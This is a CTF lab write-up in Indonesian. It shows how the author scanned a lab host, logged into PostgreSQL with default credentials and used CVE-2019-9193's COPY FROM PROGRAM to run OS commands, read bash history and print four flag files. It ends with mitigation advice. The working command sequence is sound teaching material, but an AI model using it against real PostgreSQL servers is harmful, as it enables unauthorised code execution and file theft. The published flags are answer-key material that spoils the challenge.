# CTF Write Up — Golok Lab
**Platform:** CyberAcademy  
**Category:** Services  
**Level:** Easy  
**Points:** 5  
**Target:** `10.10.0.122`  

---

## Deskripsi

> Saat ini kamu masuk di Golok Lab, Kamu diminta untuk mencari Flag dalam Services yang terdapat pada Golok Lab.  
> Salah satu clue pada lab ini : **exploit CVE**

---

## Tools yang Digunakan

- `nmap` — Port scanning & service enumeration
- `psql` — PostgreSQL client
- CVE-2019-9193 — PostgreSQL arbitrary command execution

---

## Langkah Penyelesaian

### 1. Reconnaissance — Scan Port

Langkah pertama adalah melakukan scan port untuk mengetahui service apa yang berjalan di target.

```bash
nmap -sC -sV -p- --min-rate 5000 10.10.0.122
```

**Hasil:**

```
PORT     STATE    SERVICE     VERSION
5432/tcp open     postgresql  PostgreSQL DB 10.2 - 10.7
8181/tcp filtered intermapper
9115/tcp filtered unknown
9176/tcp filtered unknown
9798/tcp filtered unknown
```

**Temuan penting:** Port `5432` terbuka dengan service **PostgreSQL versi 10.2 - 10.7**.

---

### 2. Identifikasi CVE

PostgreSQL versi 9.3 sampai 11.2 rentan terhadap **CVE-2019-9193**, yaitu celah keamanan yang memungkinkan eksekusi command OS secara arbitrary melalui fitur `COPY TO/FROM PROGRAM`.

> **CVE-2019-9193** — PostgreSQL 9.3–11.2 allows superusers to execute arbitrary OS commands via `COPY TO/FROM PROGRAM`.

---

### 3. Login ke PostgreSQL

Coba login menggunakan kredensial default:

```bash
psql -h 10.10.0.122 -U postgres -p 5432
# Password: postgres
```

Login berhasil dengan kredensial default `postgres:postgres`.

---

### 4. Eksploitasi CVE-2019-9193 — Remote Code Execution

Setelah berhasil masuk, eksploitasi dilakukan dengan membuat tabel sebagai output buffer, lalu menggunakan `COPY FROM PROGRAM` untuk menjalankan command OS.

```sql
-- Buat tabel untuk menampung output command
CREATE TABLE cmd_output (output text);

-- Eksekusi command 'id' untuk verifikasi RCE
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

**Output:**

```
uid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)
```

RCE berhasil! Kita berjalan sebagai user `postgres`.

---

### 5. Enumerasi Sistem — Cari Flag

#### Cek bash history untuk petunjuk

```sql
DELETE FROM cmd_output;
COPY cmd_output FROM PROGRAM 'cat /var/lib/postgresql/.bash_history';
SELECT * FROM cmd_output;
```

Dari bash history ditemukan petunjuk bahwa flag disimpan di beberapa lokasi di `/tmp/`.

#### Cari semua file di /tmp

```sql
DELETE FROM cmd_output;
COPY cmd_output FROM PROGRAM 'find /tmp -type f 2>/dev/null';
SELECT * FROM cmd_output;
```

**Hasil:**

```
/tmp/flag_
/tmp/.flag
/tmp/.FLAG
/tmp/flag.txt
```

#### Baca semua flag sekaligus

```sql
DELETE FROM cmd_output;
COPY cmd_output FROM PROGRAM 'cat /tmp/flag_ /tmp/.flag /tmp/.FLAG /tmp/flag.txt';
SELECT * FROM cmd_output;
```

**Output:**

```
5ce08cd8d6e27f0dd48ffb62a8660ef2   ← /tmp/flag_
01bc4bda80ef62f5088165ddcfb66532   ← /tmp/.flag
18c5a216ac48caae33f7d6e0e0759790   ← /tmp/.FLAG
dde7938ea1dd5ec523420de24e816c07   ← /tmp/flag.txt
```

---

## Flags

| # | Lokasi | Flag |
|---|--------|------|
| 1 | `/tmp/flag_` | `5ce08cd8d6e27f0dd48ffb62a8660ef2` |
| 2 | `/tmp/.flag` | `01bc4bda80ef62f5088165ddcfb66532` |
| 3 | `/tmp/.FLAG` | `18c5a216ac48caae33f7d6e0e0759790` |
| 4 | `/tmp/flag.txt` | `dde7938ea1dd5ec523420de24e816c07` |

---

## Rangkuman Serangan

```
[Attacker]
    │
    ▼
nmap scan → Port 5432 (PostgreSQL 10.7) terbuka
    │
    ▼
Login dengan kredensial default (postgres:postgres)
    │
    ▼
CVE-2019-9193 → COPY FROM PROGRAM → RCE sebagai user postgres
    │
    ▼
Enumerate /tmp → Temukan 4 file flag
    │
    ▼
FLAG ✓
```

---

## Mitigasi / Rekomendasi

1. **Ganti password default** — Jangan gunakan `postgres:postgres` di production.
2. **Update PostgreSQL** — Upgrade ke versi 11.3+ atau lebih baru yang sudah patch CVE-2019-9193.
3. **Batasi akses network** — Port 5432 tidak seharusnya terekspos langsung ke internet/jaringan publik. Gunakan firewall rules.
4. **Principle of Least Privilege** — Jangan jalankan aplikasi dengan user superuser PostgreSQL.
5. **Nonaktifkan `pg_execute_server_program`** — Cabut privilege `EXECUTE` pada fungsi `COPY FROM PROGRAM` untuk user yang tidak memerlukannya.

---

## Referensi

- [CVE-2019-9193 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-9193)
- [PostgreSQL Security Advisory](https://www.postgresql.org/support/security/)
- [CyberAcademy Platform](https://cyberacademy.id)

---

*Write up by: [username kamu]*  
*Date: Juni 2026*
